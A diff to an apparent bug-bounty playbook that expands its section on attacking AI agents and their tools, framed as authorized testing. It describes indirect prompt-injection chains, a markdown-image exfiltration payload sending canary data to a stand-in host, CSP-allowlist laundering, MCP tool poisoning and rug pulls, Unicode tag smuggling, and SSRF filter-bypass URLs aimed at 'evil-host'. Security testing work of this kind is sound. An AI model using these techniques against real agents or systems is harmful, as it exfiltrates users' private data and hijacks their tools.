@@ -50,7 +50,9 @@ All techniques are for authorized testing only — targets named in the scope ma
 
 ## PB-2 — AI agent tool abuse (confused deputy)
 
-**Provenance:** Vignesh Kumar, "How I Hunt for Bugs in AI Agent Tools", vendor-doc-verified metadata probes. Framing references: Simon Willison's "lethal trifecta" (private data + untrusted content + external communication) and OWASP GenAI LLM06:2025 Excessive Agency.
+**When it applies:** any application embedding an LLM/agent with registered tools, retrieval, or fetch capability — chat assistants, copilots, agentic workflows, MCP-connected toolchains. **Priority-tier — co-priority with PB-12:** AI-target vulnerabilities are the top-EV class of 2026 — platform-reported figures put prompt-injection reports up ~540% year-over-year, flagship AI program awards at $15,000–$172,000, and only ~12% of top AI firms running a disclosure program at all. Treat those as prioritization data, not a per-program guarantee (same hedge as PB-12's payout-per-effort ranking) — but the attacker-defender gap makes in-scope AI surface the least-crowded high-tier hunting, so run this class alongside PB-12's deterministic object-diff whenever the target exposes agent surface.
+
+**Provenance:** Vignesh Kumar, "How I Hunt for Bugs in AI Agent Tools", vendor-doc-verified metadata probes. Framing references: Simon Willison's "lethal trifecta" (private data + untrusted content + external communication) and OWASP GenAI LLM06:2025 Excessive Agency. New-class references: the EchoLeak-class zero-click markdown exfiltration disclosures (CVE-2025-32711, Microsoft 365 Copilot), Invariant Labs' MCP tool-poisoning / rug-pull / cross-server-shadowing publications, and Unicode tag-block smuggling research.
 
 ### Expanded method
 
@@ -78,9 +80,34 @@ All techniques are for authorized testing only — targets named in the scope ma
 
 **URL-filter bypass shapes (PortSwigger, per the digest):** blacklist — `127.0.0.1` encodings (2130706433, 017700000001, 127.1), a domain you register resolving to 127.0.0.1, URL-encoding/case variation, http→https redirect switch; whitelist — parser inconsistencies `https://expected-host:fakepassword@evil-host`, `https://evil-host#expected-host`, `https://expected-host.evil-host`. **Caveat:** the PortSwigger payload wordlists were JS-rendered and could not be extracted in the research pass — only the page skeleton was retrievable; use the named shapes, not a claimed full wordlist.
 
+**Indirect-injection chains [G2, owned context only]:**
+- Delivery: plant canary data in context the agent reads — a doc in your own RAG workspace, mail to your own test mailbox, a page you host, a tool output you control — then craft content that coerces the agent into emitting the canary to an OAST-correlated endpoint.
+- Auto-fetch exfil (EchoLeak class): markdown images/links the agent's renderer fetches without a click — `![x](https://<oast>/?d=<canary>)`; where inline URLs are redacted, reference-style link syntax (`[x][1]` plus a later `[1]: https://<oast>/...`) bypasses filters that only scan inline destinations.
+- CSP laundering: a CSP-allowlisted endpoint (analytics, telemetry, error-reporting host) carrying the canary in its query string is an exfil proxy the page policy permits — enumerate `connect-src`/`img-src` allowlists as the egress map.
+- Primitive: the OAST hit carrying the canary is the deterministic signal; the agent's claimed compliance is not.
+
+**MCP/tooling surface [G2]:**
+- Tool-poisoned descriptions: hidden directives embedded in the tool description itself (`<IMPORTANT>`-style blocks telling the model to read extra files or relay parameters to an attacker path) — audit tool metadata as an injection channel, not just the tool code.
+- Rug pulls: the description mutates after the user approves the tool list — re-diff advertised versus live descriptions across sessions.
+- Cross-server shadowing: one server's tool description redirects another server's parameters — test multi-server compositions, not each server alone.
+- Transport and authorization: unauthenticated SSE/HTTP transports, sessions not bound to the initiating principal, and tool-call authorization gaps where the agent's ambient credentials execute what the caller's role could not (AIX-03, `check-catalogue.md`).
+
+**Rogue-action escalation [G3]:**
+- The paying classes are consequences: cross-account data exfiltration, unauthorized tool execution, state changes, code execution via the agent's own tools — the starred ambient-authority tools from the capability map (shell, fetch, file-write, email, payment).
+- Demonstrate the executed action against your own fixtures: the OAST hit, the second test account's committed state change, the planted canary file written or sent. Stop at the minimal demonstrated consequence per `../../safety-gates`.
+- A "prompt injection worked" transcript alone is informational — the observed effect is the finding; the transcript is narration.
+
+**Unicode/encoding channels [G2]:**
+- Invisible-payload classes for injection delivery and exfil marking: Unicode tag-block characters (U+E0000–E007F encode ASCII as invisible glyphs), zero-width binary (ZWSP/ZWNJ runs), variation-selector smuggling (VS1–VS16).
+- Decoding is provider-asymmetric — a payload invisible in one stack's renderer can still reach the model's tokenizer, and vice versa: test both the rendered and the raw-text channel per provider.
+
+**Target selection:** AI-in-scope programs are the fastest-growing segment — before hunting, check the manifest's `authorized_assets` for AI surface and `automation_policy` (`ai_output`, `ai_disclosure` — `../../scope-parser`), plus the program's own AI rules: Microsoft excludes self-only injection and system-prompt leakage; Google AI VRP pays on rogue-action/exfiltration tiers. Pair with the AIX-01–AIX-07 coverage checks (`check-catalogue.md`).
+
 **Fix pattern (the reference fix shipped with regression tests for traversal, absolute paths, symlink escape):** resolve project root; resolve the requested path with `Path.resolve()` (follows symlinks, closing the symlink-pointing-outside escape); reject anything not inside the root — comparing **resolved** paths, not strings.
 
-**FP-rule refinement:** a tool accepting a traversal path in code review is a finding only when the tool actually runs with ambient authority — prove the sink with the direct call; a model *declining* in conversation is not evidence the boundary exists ("a security boundary should never depend on the model choosing to decline").
+**Evidence bar:** the planted canary value side-by-side with the OAST capture that carried it out (full request/response pairs both directions); the injected content exactly as the agent ingested it; the observed rogue action — committed-state diff, executed-tool log — not the transcript claim. Store per `../../evidence`.
+
+**FP-rule refinement:** a tool accepting a traversal path in code review is a finding only when the tool actually runs with ambient authority — prove the sink with the direct call; a model *declining* in conversation is not evidence the boundary exists ("a security boundary should never depend on the model choosing to decline"). Symmetrically, a model *complying* in conversation is not evidence of impact — prompt-injection success without an executed action (no OAST hit, no committed state change, no tool call fired) is informational on flagship programs.
 
 ## PB-3 — WebSocket event protocols and captcha-gated agent endpoints
 
